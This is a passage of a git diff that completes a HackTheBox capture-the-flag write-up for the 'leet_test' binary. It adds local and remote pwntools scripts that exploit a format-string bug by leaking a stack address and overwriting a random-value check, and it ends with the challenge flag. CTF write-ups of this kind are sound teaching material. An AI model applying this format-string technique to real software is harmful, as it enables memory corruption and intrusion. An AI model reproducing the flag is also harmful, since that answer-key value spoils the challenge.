@@ -179,4 +179,134 @@ sh.interactive()
 ![image](https://github.com/jon-brandy/hackthebox/assets/70703371/90bebb50-8652-41cf-b246-d556ae8837b2)
 
 
-10. 
+10. Here's the final script.
+
+```py
+from pwn import * 
+import os 
+os.system('clear')
+
+def start(argv=[],  *a, **kw):
+    if args.REMOTE:
+        return remote(sys.argv[1], sys.argv[2],  *a, **kw)
+    elif args.GDB:
+        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
+    else:
+        return process([exe] + argv, *a, **kw)
+
+gdbscript ='''
+init-pwndbg
+break * 0x00000000004013a7
+continue
+'''.format(**locals())
+
+exe = './leet_test'
+elf = context.binary = ELF(exe, checksec=True)
+context.log_level = 'DEBUG'
+
+def payload(exp):
+    sh.sendline(exp)
+    sh.recvuntil(b'Hello,')
+    return sh.recvline().strip()
+
+sh = start()
+#pause()
+format_str = FmtStr(execute_fmt=payload) # get fmtstr offset
+log.success('Format strings offset : %d', format_str.offset)
+
+sh.sendlineafter(b':', '%{}$p'.format(18))
+sh.recvuntil(b'Hello,')
+get = sh.recvline().strip()
+#print(get)
+get_addr = int(get, 16)
+log.success('LEAKED STACK ADDRESS --> %#0x', get_addr)
+
+# CALC THE RANDOM VALUE ADDRESS
+calc = get_addr - 272
+log.success('CALCULATED --> %#0x', calc)
+
+## perform writes
+format_str.write(calc, 0) # set to 0
+format_str.write(0x404078, 0) # set to 0 
+format_str.execute_writes()
+
+sh.interactive()
+```
+
+> RESULT LOCALLY
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/114d7ee4-0b83-4d85-9cd7-cb4e3fd569a3)
+
+
+11. Got our fake flag! But like what i said before, the remote server has different offset for the random value address 💀. So took me a while to solve this, here's the remote script.
+
+> SCRIPT REMOTE
+
+```py
+from pwn import * 
+import os 
+os.system('clear')
+
+def start(argv=[],  *a, **kw):
+    if args.REMOTE:
+        return remote(sys.argv[1], sys.argv[2],  *a, **kw)
+    elif args.GDB:
+        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
+    else:
+        return process([exe] + argv, *a, **kw)
+
+gdbscript ='''
+init-pwndbg
+break * 0x00000000004013a7
+continue
+'''.format(**locals())
+
+exe = './leet_test'
+elf = context.binary = ELF(exe, checksec=True)
+context.log_level = 'DEBUG'
+
+def payload(exp):
+    sh.sendline(exp)
+    sh.recvuntil(b'Hello,')
+    return sh.recvline().strip()
+
+sh = start()
+#pause()
+format_str = FmtStr(execute_fmt=payload) # get fmtstr offset
+log.success('Format strings offset : %d', format_str.offset)
+
+sh.sendlineafter(b':', '%{}$p'.format(38))
+sh.recvuntil(b'Hello,')
+get = sh.recvline().strip()
+#print(get)
+get_addr = int(get, 16)
+log.success('LEAKED STACK ADDRESS --> %#0x', get_addr)
+
+# CALC THE RANDOM VALUE ADDRESS
+calc = get_addr - 287
+log.success('CALCULATED --> %#0x', calc)
+
+## perform writes
+format_str.write(calc, 0) # set to 0
+format_str.write(0x404078, 0) # set to 0 
+format_str.execute_writes()
+
+sh.interactive()
+```
+
+> RESULT
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/d3b202f3-a30a-4a17-84e4-1fca6f8b4d0f)
+
+12. Got the flag!
+
+#### NOTES: If it failed locally or remotely, try to run the script again, it happens because stack address are not static. Because ASLR is on.
+
+
+## FLAG
+
+```
+HTB{y0u_sur3_r_1337_en0ugh!!}
+```
+
+
